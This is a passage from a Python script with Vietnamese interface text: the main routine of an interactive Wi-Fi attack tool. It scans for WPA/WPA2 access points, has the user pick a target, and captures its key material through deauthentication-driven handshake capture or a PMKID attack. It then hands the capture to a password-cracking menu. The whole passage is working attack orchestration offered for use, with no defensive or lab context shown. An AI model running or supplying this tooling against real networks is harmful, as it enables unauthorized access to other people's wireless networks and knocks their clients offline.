    print(f"{BOLD}Interface Wi-Fi:{W}")
    for i, iface in enumerate(ifaces, 1):
        print(f"  {i}. {iface}")

    try:
        iface = ifaces[int(input(f"\n{BOLD}Chọn interface [1-{len(ifaces)}]: {W}").strip()) - 1]
    except (ValueError, IndexError):
        print(f"{R}[!] Lựa chọn không hợp lệ.{W}")
        sys.exit(1)

    # ── Track trạng thái monitor để dễ bật/tắt đúng lúc ──
    monitor_active = False
    mon_iface = None

    target = None
    file_result = None
    is_pmkid = False

    try:
        # ── Bước 1: Bật monitor để quét AP ──
        mon_iface = start_monitor(iface)
        monitor_active = True

        aps = scan_networks(mon_iface, duration=20)
        wpa_aps = [a for a in aps if "WPA" in a["enc"].upper()]
        if not wpa_aps:
            print(f"{R}[!] Không có AP WPA/WPA2 nào.{W}")
            sys.exit(1)

        wpa_aps.sort(key=lambda a: a["clients"], reverse=True)
        total_clients = sum(ap["clients"] for ap in wpa_aps)
        with_clients  = sum(1 for ap in wpa_aps if ap["clients"] > 0)

        print(f"{G}[+] Tìm thấy {BOLD}{len(wpa_aps)}{W}{G} AP WPA/WPA2 — "
              f"{BOLD}{with_clients}{W}{G} AP có client "
              f"(tổng {BOLD}{total_clients}{W}{G} client).{W}\n")

        header = (f"{'#':<4}{'BSSID':<20}{'CH':<5}{'ENC':<14}"
                  f"{'CLIENTS':<10}{'ESSID'}")
        print(f"{BOLD}{header}{W}")
        print("─" * 82)

        for i, ap in enumerate(wpa_aps, 1):
            cli = ap["clients"]
            if cli > 0:
                cli_str = f"{G}{cli}{W}{' ' * (10 - len(str(cli)))}"
            else:
                cli_str = f"{R}0{W}{' ' * 9}"
            essid = ap["essid"] or "(ẩn)"
            print(f"{i:<4}{ap['bssid']:<20}{ap['channel']:<5}"
                  f"{ap['enc'][:12]:<14}{cli_str}{essid}")

        try:
            target = wpa_aps[int(input(f"\n{BOLD}Chọn AP [1-{len(wpa_aps)}]: {W}").strip()) - 1]
        except (ValueError, IndexError):
            print(f"{R}[!] Lựa chọn không hợp lệ.{W}")
            sys.exit(1)

        print(f"\n{C}[>] Mục tiêu: {target['essid'] or '(ẩn)'} "
              f"({target['bssid']}) kênh {target['channel']} "
              f"— {target['clients']} client{W}")

        # ── Bước 2: Chọn phương pháp ──
        print(f"\n{BOLD}Chọn phương pháp bắt:{W}")
        print(f"  1. Handshake + deauth     (cần client, ~30-60s)")
        print(f"  2. PMKID attack           (KHÔNG cần client, ~60-90s)")
        print(f"  3. Thử PMKID trước, fail thì handshake (an toàn nhất)")
        print(f"  4. Huỷ")

        method = input(f"\n{BOLD}Chọn (1-4): {W}").strip()

        if method == "4":
            print(f"{Y}[*] Huỷ.{W}")
            sys.exit(0)

        # ── Bước 3: Xử lý theo phương pháp ──
        if method == "1":
            print(f"{Y}[*] Phương pháp: Handshake + deauth{W}")
            file_result = capture_handshake(
                mon_iface, target["bssid"], target["channel"], target["essid"]
            )
            is_pmkid = False

        elif method == "2":
            print(f"{Y}[*] Phương pháp: PMKID (không cần client){W}")
            # ── QUAN TRỌNG: tắt monitor, dừng NetworkManager ──
            stop_monitor(mon_iface)
            monitor_active = False
            stop_network_services()

            file_result = capture_pmkid(
                iface,  # ← interface VẬT LÝ, không phải mon_iface
                target["bssid"], target["channel"], target["essid"]
            )
            is_pmkid = True

        elif method == "3":
            print(f"{Y}[*] Phương pháp: PMKID → handshake fallback{W}")
            # ── Thử PMKID trước ──
            stop_monitor(mon_iface)
            monitor_active = False
            stop_network_services()

            file_result = capture_pmkid(
                iface,  # ← interface VẬT LÝ
                target["bssid"], target["channel"],
                target["essid"], timeout=60
            )
            is_pmkid = True

            if not file_result:
                print(f"\n{Y}[*] PMKID thất bại, chuyển sang handshake+deauth...{W}")
                # Bật lại monitor
                mon_iface = start_monitor(iface)
                monitor_active = True

                file_result = capture_handshake(
                    mon_iface, target["bssid"],
                    target["channel"], target["essid"]
                )
                is_pmkid = False
        else:
            print(f"{R}[!] Lựa chọn không hợp lệ.{W}")
            sys.exit(1)

    finally:
        print()
        # Tắt monitor nếu đang bật
        if monitor_active and mon_iface:
            stop_monitor(mon_iface)
            print(f"{G}[+] Đã tắt monitor mode.{W}")
        # Khởi động lại NetworkManager (luôn làm cuối cùng)
        start_network_services()
        print(f"{G}[+] Đã khôi phục NetworkManager.{W}")

    if file_result and target:
        crack_menu(file_result, target["bssid"], target["essid"], is_pmkid=is_pmkid)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}[*] Dừng bởi người dùng.{W}")
        run("airmon-ng check kill")
        start_network_services()
        sys.exit(0)